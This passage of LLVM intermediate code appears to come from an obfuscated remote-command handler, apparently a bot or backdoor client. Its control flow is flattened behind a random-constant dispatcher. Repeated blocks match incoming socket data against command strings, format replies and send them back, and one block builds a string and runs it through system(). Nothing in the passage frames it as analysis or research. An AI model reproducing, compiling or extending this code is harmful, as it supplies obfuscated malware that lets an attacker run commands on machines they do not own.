  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:1820:                                   ; preds = %loopEntry
  store i32 1468737716, i32* %switchVar
  br label %loopEnd

; <label>:1821:                                   ; preds = %loopEntry
  %1822 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1823 = call i8* @strstr(i8* %1822, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.153, i32 0, i32 0)) #8
  %1824 = icmp ne i8* %1823, null
  %1825 = select i1 %1824, i32 -775908931, i32 -402073845
  store i32 %1825, i32* %switchVar
  br label %loopEnd

; <label>:1826:                                   ; preds = %loopEntry
  %1827 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1828 = call i32 (i8*, i8*, ...) @sprintf(i8* %1827, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.151, i32 0, i32 0)) #7
  %1829 = load i32, i32* %4, align 4
  %1830 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1831 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1832 = call i64 @strlen(i8* %1831) #8
  %1833 = call i64 @send(i32 %1829, i8* %1830, i64 %1832, i32 16384)
  %1834 = icmp eq i64 %1833, -1
  %1835 = select i1 %1834, i32 1087205385, i32 1196377775
  store i32 %1835, i32* %switchVar
  br label %loopEnd

; <label>:1836:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:1837:                                   ; preds = %loopEntry
  store i32 -402073845, i32* %switchVar
  br label %loopEnd

; <label>:1838:                                   ; preds = %loopEntry
  %1839 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1840 = call i8* @strstr(i8* %1839, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.154, i32 0, i32 0)) #8
  %1841 = icmp ne i8* %1840, null
  %1842 = select i1 %1841, i32 -279792557, i32 27229730
  store i32 %1842, i32* %switchVar
  br label %loopEnd

; <label>:1843:                                   ; preds = %loopEntry
  %1844 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1845 = call i32 (i8*, i8*, ...) @sprintf(i8* %1844, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.155, i32 0, i32 0)) #7
  %1846 = load i32, i32* %4, align 4
  %1847 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1848 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1849 = call i64 @strlen(i8* %1848) #8
  %1850 = call i64 @send(i32 %1846, i8* %1847, i64 %1849, i32 16384)
  %1851 = icmp eq i64 %1850, -1
  %1852 = select i1 %1851, i32 -771470575, i32 1386037940
  store i32 %1852, i32* %switchVar
  br label %loopEnd

; <label>:1853:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:1854:                                   ; preds = %loopEntry
  store i32 27229730, i32* %switchVar
  br label %loopEnd

; <label>:1855:                                   ; preds = %loopEntry
  %1856 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1857 = call i8* @strstr(i8* %1856, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.156, i32 0, i32 0)) #8
  %1858 = icmp ne i8* %1857, null
  %1859 = select i1 %1858, i32 2134643901, i32 -274915070
  store i32 %1859, i32* %switchVar
  br label %loopEnd

; <label>:1860:                                   ; preds = %loopEntry
  %1861 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1862 = call i32 (i8*, i8*, ...) @sprintf(i8* %1861, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.157, i32 0, i32 0)) #7
  %1863 = load i32, i32* %4, align 4
  %1864 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1865 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1866 = call i64 @strlen(i8* %1865) #8
  %1867 = call i64 @send(i32 %1863, i8* %1864, i64 %1866, i32 16384)
  %1868 = icmp eq i64 %1867, -1
  %1869 = select i1 %1868, i32 -209017962, i32 2113877569
  store i32 %1869, i32* %switchVar
  br label %loopEnd

; <label>:1870:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:1871:                                   ; preds = %loopEntry
  store i32 -274915070, i32* %switchVar
  br label %loopEnd

; <label>:1872:                                   ; preds = %loopEntry
  %1873 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1874 = call i8* @strstr(i8* %1873, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.158, i32 0, i32 0)) #8
  %1875 = icmp ne i8* %1874, null
  %1876 = select i1 %1875, i32 -327574455, i32 -292433707
  store i32 %1876, i32* %switchVar
  br label %loopEnd

; <label>:1877:                                   ; preds = %loopEntry
  %1878 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1879 = call i32 (i8*, i8*, ...) @sprintf(i8* %1878, i8* getelementptr inbounds ([124 x i8], [124 x i8]* @.str.159, i32 0, i32 0)) #7
  %1880 = load i32, i32* %4, align 4
  %1881 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1882 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1883 = call i64 @strlen(i8* %1882) #8
  %1884 = call i64 @send(i32 %1880, i8* %1881, i64 %1883, i32 16384)
  %1885 = icmp eq i64 %1884, -1
  %1886 = select i1 %1885, i32 549650922, i32 -2058494442
  store i32 %1886, i32* %switchVar
  br label %loopEnd

; <label>:1887:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:1888:                                   ; preds = %loopEntry
  store i32 -292433707, i32* %switchVar
  br label %loopEnd

; <label>:1889:                                   ; preds = %loopEntry
  %1890 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1891 = call i8* @strstr(i8* %1890, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.160, i32 0, i32 0)) #8
  %1892 = icmp ne i8* %1891, null
  %1893 = select i1 %1892, i32 1180548535, i32 -2042464551
  store i32 %1893, i32* %switchVar
  br label %loopEnd

; <label>:1894:                                   ; preds = %loopEntry
  %1895 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1896 = call i32 (i8*, i8*, ...) @sprintf(i8* %1895, i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.161, i32 0, i32 0)) #7
  %1897 = load i32, i32* %4, align 4
  %1898 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1899 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1900 = call i64 @strlen(i8* %1899) #8
  %1901 = call i64 @send(i32 %1897, i8* %1898, i64 %1900, i32 16384)
  %1902 = icmp eq i64 %1901, -1
  %1903 = select i1 %1902, i32 482204922, i32 -2033077397
  store i32 %1903, i32* %switchVar
  br label %loopEnd

; <label>:1904:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:1905:                                   ; preds = %loopEntry
  store i32 -2042464551, i32* %switchVar
  br label %loopEnd

; <label>:1906:                                   ; preds = %loopEntry
  %1907 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1908 = call i8* @strstr(i8* %1907, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.162, i32 0, i32 0)) #8
  %1909 = icmp ne i8* %1908, null
  %1910 = select i1 %1909, i32 -1521188557, i32 -1872816776
  store i32 %1910, i32* %switchVar
  br label %loopEnd

; <label>:1911:                                   ; preds = %loopEntry
  %1912 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1913 = call i32 (i8*, i8*, ...) @sprintf(i8* %1912, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.163, i32 0, i32 0)) #7
  %1914 = load i32, i32* %4, align 4
  %1915 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1916 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1917 = call i64 @strlen(i8* %1916) #8
  %1918 = call i64 @send(i32 %1914, i8* %1915, i64 %1917, i32 16384)
  %1919 = icmp eq i64 %1918, -1
  %1920 = select i1 %1919, i32 -820879126, i32 -1803684081
  store i32 %1920, i32* %switchVar
  br label %loopEnd

; <label>:1921:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:1922:                                   ; preds = %loopEntry
  store i32 -1872816776, i32* %switchVar
  br label %loopEnd

; <label>:1923:                                   ; preds = %loopEntry
  %1924 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1925 = call i8* @strstr(i8* %1924, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.164, i32 0, i32 0)) #8
  %1926 = icmp ne i8* %1925, null
  %1927 = select i1 %1926, i32 1616894131, i32 -436811268
  store i32 %1927, i32* %switchVar
  br label %loopEnd

; <label>:1928:                                   ; preds = %loopEntry
  %1929 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1930 = call i32 (i8*, i8*, ...) @sprintf(i8* %1929, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.165, i32 0, i32 0)) #7
  %1931 = load i32, i32* %4, align 4
  %1932 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1933 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1934 = call i64 @strlen(i8* %1933) #8
  %1935 = call i64 @send(i32 %1931, i8* %1932, i64 %1934, i32 16384)
  %1936 = icmp eq i64 %1935, -1
  %1937 = select i1 %1936, i32 1346588809, i32 1140944866
  store i32 %1937, i32* %switchVar
  br label %loopEnd

; <label>:1938:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:1939:                                   ; preds = %loopEntry
  store i32 -436811268, i32* %switchVar
  br label %loopEnd

; <label>:1940:                                   ; preds = %loopEntry
  %1941 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1942 = call i8* @strstr(i8* %1941, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.166, i32 0, i32 0)) #8
  %1943 = icmp ne i8* %1942, null
  %1944 = select i1 %1943, i32 -1324399758, i32 2109228101
  store i32 %1944, i32* %switchVar
  br label %loopEnd

; <label>:1945:                                   ; preds = %loopEntry
  %1946 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1947 = call i32 (i8*, i8*, ...) @sprintf(i8* %1946, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.167, i32 0, i32 0)) #7
  %1948 = load i32, i32* %4, align 4
  %1949 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1950 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1951 = call i64 @strlen(i8* %1950) #8
  %1952 = call i64 @send(i32 %1948, i8* %1949, i64 %1951, i32 16384)
  %1953 = icmp eq i64 %1952, -1
  %1954 = select i1 %1953, i32 -1482456118, i32 -374189052
  store i32 %1954, i32* %switchVar
  br label %loopEnd

; <label>:1955:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:1956:                                   ; preds = %loopEntry
  store i32 2109228101, i32* %switchVar
  br label %loopEnd

; <label>:1957:                                   ; preds = %loopEntry
  %1958 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1959 = call i8* @strstr(i8* %1958, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.168, i32 0, i32 0)) #8
  %1960 = icmp ne i8* %1959, null
  %1961 = select i1 %1960, i32 589273203, i32 -1774792352
  store i32 %1961, i32* %switchVar
  br label %loopEnd

; <label>:1962:                                   ; preds = %loopEntry
  %1963 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1964 = call i32 (i8*, i8*, ...) @sprintf(i8* %1963, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.169, i32 0, i32 0)) #7
  %1965 = load i32, i32* %4, align 4
  %1966 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1967 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1968 = call i64 @strlen(i8* %1967) #8
  %1969 = call i64 @send(i32 %1965, i8* %1966, i64 %1968, i32 16384)
  %1970 = icmp eq i64 %1969, -1
  %1971 = select i1 %1970, i32 651762541, i32 -1460293767
  store i32 %1971, i32* %switchVar
  br label %loopEnd

; <label>:1972:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:1973:                                   ; preds = %loopEntry
  store i32 -1774792352, i32* %switchVar
  br label %loopEnd

; <label>:1974:                                   ; preds = %loopEntry
  %1975 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1976 = call i8* @strstr(i8* %1975, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.170, i32 0, i32 0)) #8
  %1977 = icmp ne i8* %1976, null
  %1978 = select i1 %1977, i32 -771588884, i32 -1406754586
  store i32 %1978, i32* %switchVar
  br label %loopEnd

; <label>:1979:                                   ; preds = %loopEntry
  %1980 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1981 = call i32 (i8*, i8*, ...) @sprintf(i8* %1980, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.171, i32 0, i32 0)) #7
  %1982 = load i32, i32* %4, align 4
  %1983 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1984 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1985 = call i64 @strlen(i8* %1984) #8
  %1986 = call i64 @send(i32 %1982, i8* %1983, i64 %1985, i32 16384)
  %1987 = icmp eq i64 %1986, -1
  %1988 = select i1 %1987, i32 1038721011, i32 -1790609690
  store i32 %1988, i32* %switchVar
  br label %loopEnd

; <label>:1989:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:1990:                                   ; preds = %loopEntry
  store i32 -1406754586, i32* %switchVar
  br label %loopEnd

; <label>:1991:                                   ; preds = %loopEntry
  %1992 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1993 = call i8* @strstr(i8* %1992, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.172, i32 0, i32 0)) #8
  %1994 = icmp ne i8* %1993, null
  %1995 = select i1 %1994, i32 1975777437, i32 2032009135
  store i32 %1995, i32* %switchVar
  br label %loopEnd

; <label>:1996:                                   ; preds = %loopEntry
  %1997 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1998 = call i32 (i8*, i8*, ...) @sprintf(i8* %1997, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.173, i32 0, i32 0)) #7
  %1999 = load i32, i32* %4, align 4
  %2000 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2001 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2002 = call i64 @strlen(i8* %2001) #8
  %2003 = call i64 @send(i32 %1999, i8* %2000, i64 %2002, i32 16384)
  %2004 = icmp eq i64 %2003, -1
  %2005 = select i1 %2004, i32 1198657189, i32 1763552050
  store i32 %2005, i32* %switchVar
  br label %loopEnd

; <label>:2006:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:2007:                                   ; preds = %loopEntry
  store i32 2032009135, i32* %switchVar
  br label %loopEnd

; <label>:2008:                                   ; preds = %loopEntry
  %2009 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2010 = call i8* @strstr(i8* %2009, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.174, i32 0, i32 0)) #8
  %2011 = icmp ne i8* %2010, null
  %2012 = select i1 %2011, i32 794055582, i32 84715651
  store i32 %2012, i32* %switchVar
  br label %loopEnd

; <label>:2013:                                   ; preds = %loopEntry
  %2014 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2015 = call i32 (i8*, i8*, ...) @sprintf(i8* %2014, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.175, i32 0, i32 0)) #7
  %2016 = load i32, i32* %4, align 4
  %2017 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2018 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2019 = call i64 @strlen(i8* %2018) #8
  %2020 = call i64 @send(i32 %2016, i8* %2017, i64 %2019, i32 16384)
  %2021 = icmp eq i64 %2020, -1
  %2022 = select i1 %2021, i32 -856400417, i32 -455588549
  store i32 %2022, i32* %switchVar
  br label %loopEnd

; <label>:2023:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:2024:                                   ; preds = %loopEntry
  store i32 84715651, i32* %switchVar
  br label %loopEnd

; <label>:2025:                                   ; preds = %loopEntry
  %2026 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2027 = call i8* @strstr(i8* %2026, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.176, i32 0, i32 0)) #8
  %2028 = icmp ne i8* %2027, null
  %2029 = select i1 %2028, i32 -988737624, i32 -538849762
  store i32 %2029, i32* %switchVar
  br label %loopEnd

; <label>:2030:                                   ; preds = %loopEntry
  %2031 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2032 = call i8* @strstr(i8* %2031, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.177, i32 0, i32 0)) #8
  %2033 = icmp ne i8* %2032, null
  %2034 = select i1 %2033, i32 -988737624, i32 -162876220
  store i32 %2034, i32* %switchVar
  br label %loopEnd

; <label>:2035:                                   ; preds = %loopEntry
  %2036 = getelementptr inbounds [50 x i8*], [50 x i8*]* %110, i32 0, i32 0
  %2037 = bitcast i8** %2036 to i8*
  %2038 = getelementptr inbounds [100 x i8*], [100 x i8*]* %107, i32 0, i32 0
  %2039 = getelementptr inbounds [100 x i8*], [100 x i8*]* %108, i32 0, i32 0
  %2040 = getelementptr inbounds [100 x i8*], [100 x i8*]* %109, i32 0, i32 0
  %2041 = call i32 (i8*, i8*, ...) @sprintf(i8* %2037, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.178, i32 0, i32 0), i8** %2038, i8** %2039, i8** %2040) #7
  %2042 = getelementptr inbounds [50 x i8*], [50 x i8*]* %110, i32 0, i32 0
  %2043 = bitcast i8** %2042 to i8*
  %2044 = call i32 @system(i8* %2043)
  %2045 = getelementptr inbounds [100 x i8*], [100 x i8*]* %107, i32 0, i32 0
  %2046 = getelementptr inbounds [100 x i8*], [100 x i8*]* %108, i32 0, i32 0
  %2047 = getelementptr inbounds [100 x i8*], [100 x i8*]* %109, i32 0, i32 0
  %2048 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.179, i32 0, i32 0), i8** %2045, i8** %2046, i8** %2047)
  %2049 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2050 = getelementptr inbounds [100 x i8*], [100 x i8*]* %107, i32 0, i32 0
  %2051 = getelementptr inbounds [100 x i8*], [100 x i8*]* %108, i32 0, i32 0
  %2052 = getelementptr inbounds [100 x i8*], [100 x i8*]* %109, i32 0, i32 0
  %2053 = call i32 (i8*, i8*, ...) @sprintf(i8* %2049, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.179, i32 0, i32 0), i8** %2050, i8** %2051, i8** %2052) #7
  %2054 = load i32, i32* %4, align 4
  %2055 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2056 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2057 = call i64 @strlen(i8* %2056) #8
  %2058 = call i64 @send(i32 %2054, i8* %2055, i64 %2057, i32 16384)
  %2059 = icmp eq i64 %2058, -1
  %2060 = select i1 %2059, i32 -1764579099, i32 -559041329
  store i32 %2060, i32* %switchVar
  br label %loopEnd

; <label>:2061:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:2062:                                   ; preds = %loopEntry
  store i32 -162876220, i32* %switchVar
  br label %loopEnd

; <label>:2063:                                   ; preds = %loopEntry
  %2064 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2065 = call i8* @strstr(i8* %2064, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.180, i32 0, i32 0)) #8
  %2066 = icmp ne i8* %2065, null
  %2067 = select i1 %2066, i32 906792809, i32 -1160111733
  store i32 %2067, i32* %switchVar
  br label %loopEnd

; <label>:2068:                                   ; preds = %loopEntry
  %2069 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2070 = call i32 (i8*, i8*, ...) @sprintf(i8* %2069, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.181, i32 0, i32 0)) #7
  %2071 = load i32, i32* %4, align 4
  %2072 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2073 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2074 = call i64 @strlen(i8* %2073) #8
  %2075 = call i64 @send(i32 %2071, i8* %2072, i64 %2074, i32 16384)
  %2076 = icmp eq i64 %2075, -1
  %2077 = select i1 %2076, i32 2006116496, i32 -438175725
  store i32 %2077, i32* %switchVar
  br label %loopEnd

; <label>:2078:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:2079:                                   ; preds = %loopEntry
  store i32 -1160111733, i32* %switchVar
  br label %loopEnd

; <label>:2080:                                   ; preds = %loopEntry
  %2081 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2082 = call i8* @strstr(i8* %2081, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.182, i32 0, i32 0)) #8
  %2083 = icmp ne i8* %2082, null
  %2084 = select i1 %2083, i32 -942996028, i32 -289702940
  store i32 %2084, i32* %switchVar
  br label %loopEnd

; <label>:2085:                                   ; preds = %loopEntry
  %2086 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2087 = call i32 (i8*, i8*, ...) @sprintf(i8* %2086, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.183, i32 0, i32 0)) #7
  %2088 = load i32, i32* %4, align 4
  %2089 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2090 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2091 = call i64 @strlen(i8* %2090) #8
  %2092 = call i64 @send(i32 %2088, i8* %2089, i64 %2091, i32 16384)
  %2093 = icmp eq i64 %2092, -1
  %2094 = select i1 %2093, i32 -1746380519, i32 1396731683
  store i32 %2094, i32* %switchVar
  br label %loopEnd

; <label>:2095:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:2096:                                   ; preds = %loopEntry
  store i32 -289702940, i32* %switchVar
  br label %loopEnd

; <label>:2097:                                   ; preds = %loopEntry
  %2098 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2099 = call i8* @strstr(i8* %2098, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.184, i32 0, i32 0)) #8
  %2100 = icmp ne i8* %2099, null
  %2101 = select i1 %2100, i32 -2059697907, i32 401660737
  store i32 %2101, i32* %switchVar
  br label %loopEnd

; <label>:2102:                                   ; preds = %loopEntry
  %2103 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2104 = call i32 (i8*, i8*, ...) @sprintf(i8* %2103, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.185, i32 0, i32 0)) #7
  %2105 = load i32, i32* %4, align 4
  %2106 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2107 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2108 = call i64 @strlen(i8* %2107) #8
  %2109 = call i64 @send(i32 %2105, i8* %2106, i64 %2108, i32 16384)
  %2110 = icmp eq i64 %2109, -1
  %2111 = select i1 %2110, i32 2075260857, i32 -542235292
  store i32 %2111, i32* %switchVar
  br label %loopEnd

; <label>:2112:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:2113:                                   ; preds = %loopEntry
  store i32 401660737, i32* %switchVar
  br label %loopEnd

; <label>:2114:                                   ; preds = %loopEntry
  %2115 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2116 = call i8* @strstr(i8* %2115, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.186, i32 0, i32 0)) #8
  %2117 = icmp ne i8* %2116, null
  %2118 = select i1 %2117, i32 -1450101561, i32 -874786877
  store i32 %2118, i32* %switchVar
  br label %loopEnd

; <label>:2119:                                   ; preds = %loopEntry
  %2120 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2121 = call i32 (i8*, i8*, ...) @sprintf(i8* %2120, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.187, i32 0, i32 0)) #7
  %2122 = load i32, i32* %4, align 4
  %2123 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2124 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2125 = call i64 @strlen(i8* %2124) #8
  %2126 = call i64 @send(i32 %2122, i8* %2123, i64 %2125, i32 16384)
  %2127 = icmp eq i64 %2126, -1
  %2128 = select i1 %2127, i32 984183680, i32 -1211169825
  store i32 %2128, i32* %switchVar
  br label %loopEnd

; <label>:2129:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:2130:                                   ; preds = %loopEntry
  store i32 -874786877, i32* %switchVar
  br label %loopEnd

; <label>:2131:                                   ; preds = %loopEntry
  %2132 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2133 = call i8* @strstr(i8* %2132, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.188, i32 0, i32 0)) #8
  %2134 = icmp ne i8* %2133, null
  %2135 = select i1 %2134, i32 -216762143, i32 -759880557
  store i32 %2135, i32* %switchVar
  br label %loopEnd

; <label>:2136:                                   ; preds = %loopEntry
  %2137 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2138 = call i32 (i8*, i8*, ...) @sprintf(i8* %2137, i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.189, i32 0, i32 0)) #7
  %2139 = load i32, i32* %4, align 4
  %2140 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2141 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2142 = call i64 @strlen(i8* %2141) #8
  %2143 = call i64 @send(i32 %2139, i8* %2140, i64 %2142, i32 16384)
  %2144 = icmp eq i64 %2143, -1
  %2145 = select i1 %2144, i32 -950124485, i32 -222818967
  store i32 %2145, i32* %switchVar
  br label %loopEnd

; <label>:2146:                                   ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 477988641, i32* %switchVar
  br label %loopEnd

; <label>:2147:                                   ; preds = %loopEntry
  store i32 -759880557, i32* %switchVar
  br label %loopEnd

; <label>:2148:                                   ; preds = %loopEntry
  %2149 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2150 = call i8* @strstr(i8* %2149, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.190, i32 0, i32 0)) #8
  %2151 = icmp ne i8* %2150, null
  %2152 = select i1 %2151, i32 -183128906, i32 1705657385
  store i32 %2152, i32* %switchVar
  br label %loopEnd

; <label>:2153:                                   ; preds = %loopEntry
  %2154 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2155 = call i32 (i8*, i8*, ...) @sprintf(i8* %2154, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.191, i32 0, i32 0)) #7
  %2156 = load i32, i32* %4, align 4
  %2157 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2158 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2159 = call i64 @strlen(i8* %2158) #8
  %2160 = call i64 @send(i32 %2156, i8* %2157, i64 %2159, i32 16384)
  %2161 = icmp eq i64 %2160, -1
